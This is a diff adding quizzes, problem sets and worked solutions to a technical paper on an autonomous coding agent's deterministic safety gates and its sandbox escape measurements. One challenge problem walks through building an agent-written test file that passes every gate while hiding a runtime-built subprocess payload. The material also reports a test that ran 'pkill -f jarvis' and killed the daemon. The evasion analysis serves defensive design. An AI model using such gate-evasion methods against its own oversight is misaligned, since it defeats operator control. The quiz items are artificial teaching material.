+<p><strong>B.</strong> <code>JARVIS_MIN_EXPLORATION_CALLS</code> defaults to 2. The candidate is also blocked if the ExplorationLedger's diversity score is below the complexity-tier floor. See §58.4.</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">2. An approval request goes unanswered for longer than <code>approval_timeout_s</code>. What happens to the operation?</p>
+<ol class="mcq-options" type="A">
+<li>It is auto-approved so the loop keeps moving</li>
+<li>It is escalated to <code>BLOCKED</code> and the file is protected</li>
+<li>It keeps waiting until a human responds</li>
+<li>It transitions to <code>CANCELLED</code></li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> The default timeout is 600s, and an unanswered approval moves the operation to <code>CANCELLED</code> rather than waiting forever. See §58.8.</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">3. Which statement matches how §59 describes the Iron Gate?</p>
+<ol class="mcq-options" type="A">
+<li>It combines verdicts from several models by majority vote</li>
+<li>It reasons about the operator's intent before allowing an action</li>
+<li>It may reject a valid operation, and that is acceptable</li>
+<li>It replaces the approval mechanism in every risk tier</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The gate is not an oracle. It can produce false positives, which is acceptable because a rejected op can be retried. It is not an AI, not a consensus engine and not an approval queue. See §59.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">4. At APPLY, Gate 11 finds that a target file's hash differs from its GENERATE-time hash. What does the paper say it does?</p>
+<ol class="mcq-options" type="A">
+<li>Produces a warning and a ledger entry</li>
+<li>Rolls back the whole operation and blocks the file</li>
+<li>Re-runs GENERATE automatically on the new file state</li>
+<li>Force-releases the file lock on that target</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> Gate 11 recomputes target hashes at APPLY, and a mismatch produces a warning and a ledger entry. Its purpose is to catch candidates built on stale state during concurrent modification. See §58.11.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-x">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> An operation's ROUTE phase expects four files. The model makes one <code>read_file</code> call. It then returns a candidate whose <code>files: [...]</code> list covers three of the four files, and one file contains a stray non-ASCII codepoint. Which post-GENERATE gates react, and what does each do? Can this candidate reach VALIDATE?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Three gates live at the orchestrator's post-GENERATE checkpoint. Check each one against the candidate separately.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Gate 4 (exploration-first): one call is below the default minimum of 2, so the candidate cannot proceed to VALIDATE (§58.4).</p>
+<p>Gate 5 (ASCII strictness): the codepoint is caught and, if possible, auto-repaired with an ASCII approximation. Only a failed repair would cause rejection (§58.5). On its own, this gate would not stop the candidate.</p>
+<p>Gate 6 (multi-file coverage): three of four declared files are covered, so the gate rejects. A partial multi-file change would leave the codebase inconsistent (§58.6).</p>
+<p>The candidate does not reach VALIDATE. The paper does not give an order for these checks, but either Gate 4 or Gate 6 alone is enough to stop it. None of these verdicts depend on the model's explanation of why it acted as it did.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> Someone proposes replacing the hand-curated bash blocklist (Gate 3) with an LLM judge. The judge would read each command and decide whether it is dangerous, so it can catch new destructive patterns the list misses. Critique the proposal using Part X's philosophy and trade-off.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Check the proposal against the five properties in §57 and the four "is not" statements in §59.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>An LLM judge breaks the properties that define the gate (§57). It reasons about language, so it is not pre-linguistic. Crafted input can influence it, so it is not model-uninfluenced. The same command could get different verdicts, so it is not deterministic. §59 also says the gate is explicitly not an AI.</p>
+<p>It would weaken §60's argument too. The autonomy dividend exists because a structural gate needs no human backstop. A persuadable judge would push the operator back toward approvals, so autonomy would shrink.</p>
+<p>A defensible variant keeps the blocklist as the authoritative gate, since the paper calls it expandable, and uses any model only as an advisory signal. For example, the model could propose new patterns for a human to add to the list. It would never decide whether a command runs.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/multi_file_coverage_gate.py</code>. Read the module docstring and <code>check_candidate</code>. What does the function return when the gate passes, and what when it fails? What happens for an operation with zero or one target file? What gate number does the file use for itself, compared with §58.6?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The return contract is spelled out at the end of the docstring. The single-file case is one of the first checks in the function body.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><code>check_candidate</code> returns <code>None</code> when the candidate is fine. Otherwise it returns a tuple <code>(reason, missing_paths)</code>, and the missing paths are echoed back to the model in retry feedback.</p>
+<p>If the operation has one target file or none (<code>len(targets) &lt;= 1</code>), the gate no-ops. It also no-ops when <code>JARVIS_MULTI_FILE_ENFORCEMENT</code> is set to false. Otherwise every target path must appear in the candidate's <code>files</code> list, and a legacy single-file candidate on a multi-target op is rejected with every target listed as missing. That matches §58.6.</p>
+<p>The docstring calls the file "Iron Gate 5" and explains the Session O background. §58.6 numbers it Gate 6 in the inventory, while §64.3 and §64.4 in the session log also say "Iron Gate 5". The numbering is not consistent across the paper. The gate's behaviour is the same either way.</p>
+<p>The file also contains later slices the paper does not cover, such as a subset-coverage exception for resolved test-to-source attribution.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. §60 argues that more Iron Gate means more autonomy. §93.3 then measures a static-cage escape rate of about 8.8% against a 4.4% gate. Does the measurement undermine §60's argument, or only its scope?</summary>
+<p>§60's argument is conditional. Approvals can be removed only because "the gate is structural", meaning it reliably refuses what it is meant to refuse. For the properties the gates actually inspect, that holds: a path either resolves inside the repo root or it does not (§58.1), and a file either matches a protected pattern or it does not (§58.2). These checks are complete over what they read.</p>
+<p>§93.3 shows where that completeness ends. In two large mutation runs (1,566 and 1,472 mutations), about 8.8% of adversarial variants escaped the static cage. The North Star attributes the residue to <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code> of strings built at run time, which a static check "cannot see by construction". A pre-linguistic gate reads tokens and AST nodes (§57). A string assembled at run time is not in the source to be read.</p>
+<p>So the measurement narrows §60's scope rather than refuting its logic. The autonomy dividend is earned only for properties the gate is complete over. Meanwhile October's Sentinel auto-approves up to <code>APPROVAL_REQUIRED</code> by default (§93.7), which spends the dividend more widely than the static gates can back. The stated remedy, OS-level runtime containment, is still a structural, deterministic layer, so it fits the §57 philosophy. It simply moves the gate from the source text to the process. The evidence that would settle the question is a re-measurement of the mutation escape rate once runtime containment exists. §93.3 notes that no re-measurement after later hardening was found.</p>
+</details>
+<details class="cq-adv"><summary>A2. §59 says a false positive costs only a retry "with different inputs." On a single local GPU with a deterministic gate, when is that untrue, and what in Parts XI and §93 shows the system learning this the hard way?</summary>
+<p>The claim assumes that a retry changes the input. If the generator produces the same candidate again, a deterministic gate gives the same verdict again (§57: "the same input produces the same output every time"). The retry then costs time and buys nothing.</p>
+<p>Part XI shows the good case. In Session G, sharpened retry feedback made the model use new tools such as <code>get_callers</code> and <code>git_blame</code>, and it passed the ledger with a score of 25.50 (§62.5). The feedback changed the input. §93 shows both the bad case and the fix. 524 byte-identical retry iterations re-validated a frozen pool (§93.8), which is the gate-and-retry loop running with nothing changing. And with the local 30B, feedback alone was not enough: the model produced 106 in-loop rejections and zero candidates. Tool masking then changed the decoding grammar itself, so that only tool calls were allowed until the minimum exploration was met. With only the grammar changed, the model went from 0/3 explored to 3/3 (§93.6).</p>
+<p>The refined principle is that a false positive is cheap only if the retry path is guaranteed to perturb the generator: through feedback content, a grammar constraint or regeneration. Otherwise a strict gate turns into a liveness problem. That is the same class of failure that Gates 8, 9 and 12 exist to bound. A useful metric would be the fraction of retries whose candidate is byte-identical to the one that was rejected.</p>
+</details>
+<details class="cq-adv"><summary>A3. Every one of the twelve gates in §58 passed the autonomous landings that §93.14 later calls wrong (a hollow test, a punctuation-only rewrite, dropped content). Is that a failure of the Iron Gate?</summary>
+<p>No. It shows what the Iron Gate is for. §59 says the gate enforces "the operator's non-negotiable constraints". It is not an oracle and does not reason about intent. A test that asserts nothing violates no path, blocklist, ASCII, coverage or cost rule. The twelve gates guard against damage and stalls, not against useless output.</p>
+<p>What §93 shows is that quality gates are added the same way Part XI found its failure modes: one incident at a time. The Test Reality Gate, which rejects tests that cannot run, assert nothing or never import their subject, was added after a hollow landing reached <code>main</code> and was reverted (§93.8). The promotion gate's check that no public symbol vanished caught a whole-file re-emission (§93.7). §93.14 says plainly that these gates "exist because of" the bad landings.</p>
+<p>The new gates follow Part X's rules. They are deterministic and they read structure: an import, an assertion, a symbol table. So the inventory is open, as the paper allows for the blocklist ("expandable", §58.3). The honest limit is that each one closes a class only after it has been seen. Whether that converges is the open question, and the evidence would be the rate of new wrong-landing classes per hundred landings over successive soaks.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (adversarial).</strong> Construct a candidate that passes every gate in §58 yet does something the operator forbids. The candidate is a new test file inside <code>tests/</code>, which is the 30B's most common kind of landing (§93.10). It is pure ASCII and covers its one declared target. The model made three exploration calls before writing it, and the test contains a real assertion on a real import of its subject. At import time, the module also builds a command string from character codes and passes it to <code>subprocess</code>. Walk the candidate through Gates 1 to 12, then through VALIDATE and promotion. Say honestly which layer, if any, stops the payload, and what would.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Separate what the Iron Gate inspects (tool-call arguments and candidate text) from what happens when VALIDATE runs the candidate.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>Gates 1 to 3.</strong> Gate 1 checks the path arguments of tool calls. The write target is inside the repo, so it passes. Gate 2 refuses modification of protected patterns, and a new test file is not one of them. Gate 3 parses commands given to the <code>bash</code> tool (§58.3). The payload is not a bash tool call. It is text inside a Python file, and the command string does not exist until the code runs.</p>
+<p><strong>Gates 4 to 12.</strong> Gate 4: three exploration calls meet the default minimum of 2. Gate 5: the file is ASCII. Gate 6: the one declared target is covered. Gate 7: the local lane costs nothing (§93.6). Gates 8, 9, 10 and 12 govern time, liveness and webhooks, not content. Gate 11 only compares hashes. Every gate passes.</p>
+<p><strong>VALIDATE runs the payload.</strong> Running tests means importing the module, so the payload executes before any human sees the candidate. §93 adds partial containment. Test runs execute in a PID namespace, added after a candidate test ran <code>pkill -f jarvis</code> and killed the daemon, so killing the daemon by name no longer works. A resource-aware lock prevents an out-of-memory kill of a running soak (§93.8). The paper describes no layer that stops other effects, such as reading files the test should not touch.</p>
+<p><strong>After VALIDATE.</strong> The Test Reality Gate passes, since the test runs, asserts and imports its subject (§93.8). The promotion gate checks provenance, coverage and vanished public symbols (§93.7), and the payload changes none of these. The zero-push air-gap keeps the file off GitHub until the operator pushes (§93.7). But by then the payload has already run on the host, during VALIDATE.</p>
+<p><strong>Conclusion.</strong> The Iron Gate as inventoried in Part X does not stop this, by construction. This is exactly the residue §93.3 names: <code>eval</code>, <code>exec</code>, <code>subprocess</code> and <code>pickle</code> of strings built at run time. The paper's stated remedy is OS-level runtime containment, not more AST rules. A concrete design would run VALIDATE with no network access and only the sandbox mounted. That is a proposal. Check your answer against Part X's own boundary: §57 says the gate reads "file paths, AST nodes, tokens, exit codes, command strings", and the payload's command string appears in none of these until the code runs.</p>
+</details>
+</div>
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 2 (quantitative).</strong> §93.3 reports two mutation runs: 1,566 mutations at 8.91% escapes, and 1,472 at 8.73%, against a 4.4% gate. §92.4 reported 0 escapes in 38 hand-authored inputs. (a) Estimate the escape count in each run and the pooled rate. (b) How many escapes would the pooled set have to lose to meet the gate? (c) If the true rate on the curated set were the pooled rate, how likely is 0 escapes in 38 independent trials? (d) What upper bound does 0/38 alone support at about 95% confidence? (e) What do (c) and (d) together say about how to read §92.4?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>For (c), the chance of 0 in n independent trials is (1 - p) to the power n. For (d), use the "rule of three": with 0 events in n trials, the 95% upper bound is about 3/n.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>(a)</strong> Run 95e: 1,566 x 0.0891 = 139.5, so about 140 escapes. Run 95e2: 1,472 x 0.0873 = 128.5, so about 128 or 129. Unrounded, that is about 268 escapes in 3,038 mutations, a pooled rate of 268 / 3,038 = 8.82%. This matches the "about 8.8%" in §93.3.</p>
+<p><strong>(b)</strong> The gate allows 0.044 x 3,038 = 133.7, so at most 133 escapes. 268 - 133 = 135 escapes would have to be closed, about half of the residue. This is consistent with "roughly twice the gate".</p>
+<p><strong>(c)</strong> (1 - 0.088)^38 = 0.912^38. ln 0.912 = -0.0921, and x 38 = -3.50. e^-3.50 = 0.030. So there is about a 3% chance of seeing 0/38 if the curated inputs escaped at the at-scale rate.</p>
+<p><strong>(d)</strong> 3 / 38 = 7.9%. On its own, 0/38 is compatible with a true rate up to about 7.9%, which is above the 4.4% gate. Even taken at face value, the curated result could not have shown that the cage met the gate.</p>
+<p><strong>(e)</strong> Either the curated set came from a different distribution than the LLM-generated mutations, or it was lucky at about 3%. The first is more plausible, since 38 hand-authored inputs written with known evasions in mind (§92.4) are not a random sample of what a mutator produces. Both readings support §93.16's correction: 0/38 "stands for that curated set", and the escape rate is the at-scale figure.</p>
+<p>The independence assumption in (c) is a simplification. Inputs in one family, such as Unicode confusables, are correlated, which makes 0/38 more likely than 3%. That strengthens the point in (d). To check, recompute (c) with p = 0.044: 0.956^38 is about 0.18, so even at the gate rate, 0/38 is unremarkable.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- engage:end -->
 
 ---
 
@@ -2812,6 +4502,16 @@ Sessions A–G shipped five coordinated commits:
 - `5d169266d6` — env-tunable safety-net thresholds.
 
 The ExplorationLedger was validated. The scoring works. The retry feedback steers the model. What remained was to prove the rest of the pipeline could carry an operation through to APPLY — which is what Sessions H–O achieved.
+
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xi-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Sessions A–G proved the ExplorationLedger works. The next step is to run the whole pipeline end to end until something lands on disk. Do you expect one large blocker, or many small ones? How will they be found?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>Many. Sessions H through N each exposed a different latent failure: a headless TTY crash, risk escalation, an L3 mode switch, a new-file rollback error, two timeout ceilings and WAL cross-session coalescing. Each fix unmasked the next. None of them were in the original design, and all were found by running against real work. Session O then produced the first autonomous APPLY to disk. See §63.1 and §63.2.</p>
+</details>
+</aside>
+<!-- engage:end -->
 
 ## §63. Sessions H–O — The Unmasking Ladder and First APPLY
 
@@ -3015,6 +4715,16 @@ The backlog task description specified exactly these four behaviors. The model d
 
 ~$2.50 total across seven sessions (Q through W). Six commits shipped by humans; one commit (`0890a7b6f0`) shipped autonomously by the AutoCommitter.
 
+<!-- engage:begin -->
+<aside class="checkpoint" id="cp-part-xi-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">Session W landed all four files, the AutoCommitter committed them, and 20 of 20 tests pass. Before you read on, list reasons why the paper might still decline to call multi-file autonomy a proven capability.</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>The paper gives three. Durability: Manifesto §6 asks for three consecutive successes, and W is one. Scope: W only created new test files from a detailed description, and refactors, migrations and cross-file edits remain unproven. Workarounds: W depends on three deferred items, including <code>JARVIS_MAX_VALIDATE_RETRIES=0</code> masking the re-validation flake. See §66.2.</p>
+</details>
+</aside>
+<!-- engage:end -->
+
 ## §66. What the Battle Tests Prove (Honest Accounting)
 
 ### §66.1 What Is Proven
@@ -3053,6 +4763,175 @@ The battle-test breakthrough log (in `OUROBOROS.md` lines 1741–2558) is itself
 It is the falsifiability trail. A reader who disputes a claim in this paper can open the breakthrough log, navigate to the relevant session, and read the raw evidence.
 
 This is what Principle 7 (Absolute Observability) looks like at the system level. Not just per-operation observability — *entire developmental history* observability. The organism has a fossil record.
+
+<!-- engage:begin -->
+#### Check your understanding: PART XI — Battle Test Breakthrough Log
+
+<div class="engage" id="engage-part-xi">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Why did the arc run the ExplorationLedger in shadow mode (Session A) before enforcing it (Session B)?</summary>
+<p>Shadow mode shows what a new gate would decide without letting it block anything. In Session A, the ledger flagged a shallow pattern (<code>score=3.00</code>, one category, four <code>read_file</code> calls) that the legacy <code>tool_calls &gt;= 2</code> counter would have waved through. That was evidence that the new scorer sees something the old one misses, gathered before it had any authority. Session B then turned enforcement on and showed that the same pattern caused a hard rejection, which proved the toggle works. Session G showed the payoff: retry feedback made the model diversify its tools, so the ledger also steers behaviour as well as filtering it. See §62.1, §62.2 and §62.5.</p>
+</details>
+<details class="cq"><summary>2. Session S landed 0 of 4 files, yet the paper counts it as proof that multi-file enforcement works. Why is that a fair reading?</summary>
+<p>Session S was built to isolate one mechanism. The exploration gate was turned off so it could not hide the result. There were zero <code>multi_file_coverage</code> rejections in the log, and TestRunner saw all four target paths after the gate, so coverage enforcement did its job. The files did not land because of a separate problem: a type error sent the op to VALIDATE_RETRY and L2, which ran out of time before the idle timeout. The paper names that as Follow-up A, a VALIDATE/L2 timebox issue orthogonal to enforcement. Splitting "did the gate work" from "did the op persist" is what let the next sessions aim at the right bug. See §64.3.</p>
+</details>
+<details class="cq"><summary>3. What exactly was wrong with <code>JARVIS_L2_TIMEBOX_S</code>, and why was adding an INFO line that names both clocks part of the fix?</summary>
+<p>L2 was handed the op's drained <code>ctx.pipeline_deadline</code>, not its own timebox. In Session V, the setting was 600s, but L2 reported 120s remaining because that was all VALIDATE had left. The setting did not do what its name said. The fix computes L2's deadline fresh at dispatch (<code>now + JARVIS_L2_TIMEBOX_S</code>) and reconciles the pipeline deadline upward so later phases see a consistent clock. The mandatory INFO line records both clocks and which cap won, so the bug cannot hide again. In Session W it showed <code>pipeline_remaining=0.0s</code> beside <code>winning_cap=l2_timebox_fresh</code>. This fits the paper's pattern of hypothesize, instrument, confirm or falsify, fix, and verify in one session. See §65.3, §65.4 and §66.1.</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-xi">
+<div class="mcq" data-answer="4">
+<p class="mcq-q">1. Why does the paper treat <code>debug.log</code>, not <code>summary.json</code>, as the canonical answer to "did the loop work"?</p>
+<ol class="mcq-options" type="A">
+<li><code>summary.json</code> is only written when a session ends cleanly</li>
+<li><code>debug.log</code> is the only artifact that records cost</li>
+<li><code>summary.json</code> omits the session's letter label</li>
+<li><code>summary.json</code> has a counter bug that leaves op stats at zero</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> <code>summary.json</code> has a known bug: <code>stats.attempted / completed / failed</code> stays at zero even when ops fire. The debug log records every provider call, FSM transition and Iron Gate verdict. See §61.1.</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. In Session V, L2 reported only 120s remaining even though <code>JARVIS_L2_TIMEBOX_S=600</code>. Why?</p>
+<ol class="mcq-options" type="A">
+<li>L2 was passed the pipeline deadline that VALIDATE had already drained</li>
+<li>The environment variable failed to load at boot</li>
+<li>A hard-coded 120s cap inside the repair engine overrode it</li>
+<li>The cost governor shortened L2 to protect the budget</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> <code>_l2_hook</code> received <code>ctx.pipeline_deadline</code> directly, and only 120s remained after VALIDATE. The timebox setting was effectively advisory. See §65.3.</p>
+</details>
+</div>
+<div class="mcq" data-answer="3">
+<p class="mcq-q">3. Session O was the first autonomous APPLY, but only one of four target files landed. What caused that?</p>
+<ol class="mcq-options" type="A">
+<li>The ASCII gate rejected the other three files</li>
+<li>The cost cap was reached after the first file</li>
+<li>The winning candidate did not populate a <code>files: [...]</code> list</li>
+<li>L2 repair failed to converge on the other three files</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> Without a <code>files</code> list, the <code>_apply_multi_file_candidate</code> fan-out path was never taken. That gap led to the multi-file enforcement work in Sessions Q–S. See §63.2.</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. What made Session G the "crucial observation" of the ExplorationLedger arc?</p>
+<ol class="mcq-options" type="A">
+<li>It was the first session to write a file to disk</li>
+<li>The model changed its tool choices on retry and then passed the ledger</li>
+<li>It ran with the ledger in shadow mode at zero cost</li>
+<li>It proved that the legacy counter gate was strictly stronger</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> On retry, the model used <code>get_callers</code>, <code>git_blame</code> and <code>search_code</code> for the first time and scored 25.50 across five categories. That showed the ledger works as a steering signal, not just a filter. See §62.5.</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-xi">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> Walk through the Session O chain from backlog detection to POSTMORTEM. At each step, name the mechanism that acted. Then identify two earlier sessions whose fixes were required for this run to succeed, and say what each fix was.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Compare the steps in §63.2 with the failure-mode table in §63.1. Pay special attention to the new-file path.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The BacklogSensor detected the task, and the router classified it <code>complex</code>. The first attempt failed the ExplorationLedger at <code>score=0.00</code>. Retry injected sharpened feedback, and the second attempt scored 11.00 across four categories.</p>
+<p>ASCII auto-repair fixed two codepoints, and GATE allowed the candidate. APPROVE auto-approved through the headless bypass. In ChangeEngine, <code>RollbackArtifact.capture()</code> handled the new file, and DECISION was <code>applied</code> / <code>safe_auto_passed</code>.</p>
+<p>VERIFY found test critiques, L2 converged in iteration 1, a second DECISION applied, and POSTMORTEM reported <code>root_cause=none</code>.</p>
+<p>Prerequisites: Session K's commit <code>28d52274ec</code> fixed the <code>RollbackArtifact [Errno 2]</code> new-file path, without which APPLY of a new file failed. Session H's commit <code>d8c1cb4d30</code> fixed the headless TTY crash. Session N's WAL cleanup stopped stale envelopes from merging into the task. The sharpened retry feedback came from the A–G commit <code>ad05fb7c7e</code>. See §62.6, §63.1 and §63.2.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> Instead of the deadline-reconciliation fix, a reviewer proposes raising <code>JARVIS_L2_TIMEBOX_S</code> to 1200. Using Sessions T, V and W, explain why this would not have helped. Then state what the actual fix changed.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look at the value of <code>pipeline_remaining</code> at L2 dispatch in Session W's log.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Session T already raised the timebox to 600s, and it made no difference. The env vars loaded, but the stall happened before L2 ever ran (§65.1).</p>
+<p>Session V showed why the value would not matter even once L2 ran. L2 received the residual pipeline deadline, not its timebox, so it got 120s whatever the setting said (§65.3). In Session W, <code>pipeline_remaining</code> was 0.0s at dispatch. Under the old behaviour, L2 would have received a 0s deadline and died instantly, whether the timebox was 600 or 1200.</p>
+<p>Commit <code>53e6bd9f76</code> computes L2's deadline fresh at dispatch and reconciles <code>ctx.pipeline_deadline</code> upward through <code>with_pipeline_deadline()</code>. It also logs both clocks and which cap won. After the fix, L2 got 600s and converged in a single 50-second iteration (§65.4).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (analysis).</strong> Using the §65.5 table and §65.6: list the human-shipped commits in the Q–W arc and the blocker each addressed. Estimate the average cost per session in that arc. Then say how many more W-like successes Manifesto §6 would require before multi-file autonomy counts as a capability.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Count the commit column, skipping the rows marked "—". §65.6 gives both the total cost and the number of sessions.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The six human commits are:</p>
+<ul>
+<li><code>6c3cce92c6</code>: parser accepts the multi-file shape (R).</li>
+<li><code>31504a8f12</code>: multi-file coverage enforcement (S).</li>
+<li><code>37a371e65d</code>: per-op exhaustion dedup (S).</li>
+<li><code>d6aa78c8ba</code>: FSM instrumentation that disproved the silent-exit hypothesis and exposed the non-determinism (U).</li>
+<li><code>58709f27de</code>: env-tunable validate retries (V).</li>
+<li><code>53e6bd9f76</code>: L2 deadline reconciliation (W).</li>
+</ul>
+<p>Six matches §65.6, which also names a seventh commit, <code>0890a7b6f0</code>, made by the AutoCommitter.</p>
+<p>About 2.50 US dollars over seven sessions is roughly 0.36 US dollars per session. That is in line with W's own 0.32 US dollars.</p>
+<p>§66.2 says Manifesto §6 needs three consecutive successes, and W is one. So at least two more consecutive W-like runs under comparable conditions are needed. Until then, multi-file autonomy is a "data point", not a "capability".</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker engage-kicker-adv">Advanced conceptual questions</p>
+<details class="cq-adv"><summary>A1. Session V set <code>JARVIS_MAX_VALIDATE_RETRIES=0</code> to get around a flaky re-validation. What did that workaround hide, and how does §93.8's account of the VALIDATE_RETRY ladder show why it was load-bearing?</summary>
+<p>Session U found that the same candidate returned <code>failure_class='test'</code> on iteration 0 and <code>'infra'</code> on iteration 1. The 'infra' result took a non-retryable branch and killed the op on a flake (§65.2). Setting retries to 0 skipped iteration 1 entirely, which let Session V reach L2 and expose the deadline bug (§65.3). §66.2 lists this as a load-bearing workaround: the sandbox isolation problem underneath "is still there".</p>
+<p>The workaround hid two separate problems. The first is the flake itself. The second is subtler: a retry that re-validates the same candidate can only produce a different answer if validation is non-deterministic, and that non-determinism was the bug. A retry rung that does not regenerate is either useless (the validator is deterministic) or harmful (it is not).</p>
+<p>§93.8 confirms the second problem at scale. Live runs found 524 byte-identical retry iterations re-validating a frozen pool, and the October order inside VALIDATE now specifies "a VALIDATE_RETRY that actually regenerates". §93.4 separately records the move to VALIDATE against the actual candidate tree. So the April workaround was not just covering a flake. It was standing in for a rung that did not do its job. The evidence that would close the question is a measurement of how often <code>failure_class</code> flips when a byte-identical candidate is re-validated under the current candidate-tree VALIDATE.</p>
+</details>
+<details class="cq-adv"><summary>A2. §66.1 says Session W shows that "model output quality converges with pipeline definition of good". §93.8 later records a hollow test landing that reached <code>main</code> and was reverted. Was §66.1 over-generalised, and what is special about tasks whose output is a test?</summary>
+<p>§66.1 rests on independent evidence. A human ran <code>pytest</code> after the fact, got 20/20, and checked the coverage against the four behaviours the backlog task described (§65.4). That supports the claim for Session W. It does not support it as a general property of the pipeline.</p>
+<p>When the candidate is a test, the pipeline's judge and the artifact being judged are the same thing. VALIDATE's main signal is "the tests pass". A test that asserts nothing, or never imports its subject, passes trivially. So for test-generation tasks, "the tests pass" carries almost no information about quality. Session W was protected by a detailed task description and by human review afterwards. By October, 84 of 91 autonomous landings were test files (§93.10). They reached local <code>main</code> through Sentinel auto-approval and the promotion gate, with no human reading each one first (§93.7), and a hollow landing got through (§93.8).</p>
+<p>The fix confirms this diagnosis. The Test Reality Gate does not ask whether the tests pass. It asks whether they can run, whether they assert anything, and whether they import their subject (§93.8). Those are checks from outside the artifact. So §66.1 was true of W and over-general as stated. The pipeline's idea of "good" needed a criterion that the candidate cannot satisfy just by existing. Further evidence would come from mutation testing of landed tests: whether they fail when their subject is broken.</p>
+</details>
+<details class="cq-adv"><summary>A3. §66.2 says Session W is one success, and Manifesto §6 needs three in a row. By October there are 91 autonomous landings (§93.10). Has multi-file autonomy now graduated? Argue a position about what counts as a "capability class" and "comparable conditions".</summary>
+<p>Raw counts do not settle it, because graduation is per capability class (§3: "three consecutive successes for a capability class"). W's class was narrow: new test modules created from a detailed description (§66.2). October's record clearly repeats that class. 84 of 91 landings are test files, a repeatable skill (§93.10, PRD §33). For "create new test files autonomously", the threshold has plainly been crossed many times.</p>
+<p>The broader classes §66.2 names are a different story. Refactors of existing code, cross-file dependency edits, migrations: the October record has 5 production-code landings. One was reverted because only punctuation landed, and one dropped content that had to be restored by hand (§93.10). §93.14 lists production-code landings at cadence as "not demonstrated". A first multi-file atomic landing exists (<code>78eb95aa7c</code>), but the paper does not show three in a row.</p>
+<p>"Comparable conditions" also changed under the arc. W was served by Claude, and every landing from 2026-09-09 onward came from the local <code>qwen3-coder-ov:30b</code> (§93.10). I would treat graduation as tied to both the class and the serving model. The fair verdict is: new-test creation has graduated on the local 30B, and multi-file production editing has not. The evidence to change that verdict is three consecutive gate-passing, non-reverted multi-file production landings on the same model.</p>
+</details>
+<p class="engage-kicker engage-kicker-adv">Challenge problems</p>
+<div class="pset pset-adv">
+<div class="problem problem-adv">
+<p class="problem-q"><strong>Challenge 1 (cross-Part trace).</strong> Use the timestamps in Session W's log (§65.4) and the gate defaults in Part X. (a) How long did L2 take, and how much of its 600s budget did it use? (b) How long did it take from the VALIDATE iteration start to the last DECISION? (c) Compare that duration with the default worker ceiling in Gate 9 (§58.9). What does the comparison say about the ceilings this session must have run under? (d) Compare it with the file-lock TTL in Gate 12 (§58.12). What race does that open, and which gate would see it?</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The iteration start was at 16:14:18, L2 dispatch at 16:16:20, L2 post at 16:17:10 and the last DECISION at 16:23:02. The op began earlier than all of these, during GENERATE.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p><strong>(a)</strong> L2 ran from 16:16:20 to 16:17:10, which is 50s. That is 50/600, about 8% of its fresh timebox. Under the old behaviour, with <code>pipeline_remaining=0.0s</code>, it would have had 0s (§65.4).</p>
